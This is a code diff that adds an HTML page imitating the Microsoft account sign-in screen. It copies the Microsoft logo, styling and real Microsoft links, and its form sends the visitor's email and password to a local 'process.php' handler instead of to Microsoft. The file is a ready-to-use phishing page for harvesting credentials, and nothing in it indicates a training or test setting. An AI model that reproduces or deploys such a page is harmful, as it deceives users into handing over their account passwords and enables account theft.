@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            width: 380px;
+            padding: 30px 40px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 20px 0 15px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px 0;
+            margin-bottom: 15px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus {
+            border-bottom: 1px solid #0067b8;
+        }
+        .button-container {
+            text-align: right;
+            margin-top: 20px;
+        }
+        button {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 8px 24px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft" width="108">
+        </div>
+        <h1>Sign in</h1>
+        <form action="process.php" method="post">
+            <input type="text" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <div class="links">
+                <a href="https://signup.live.com/signup">No account? Create one!</a><br>
+                <a href="https://account.live.com/password/reset">Can't access your account?</a>
+            </div>
+            <div class="button-container">
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+    <div class="footer">
+        <div class="terms">
+            <a href="https://www.microsoft.com/en-us/servicesagreement/default.aspx">Terms of use</a>
+            <a href="https://www.microsoft.com/en-us/privacy/privacystatement">Privacy & cookies</a>
+        </div>
+    </div>
+</body>
+</html>
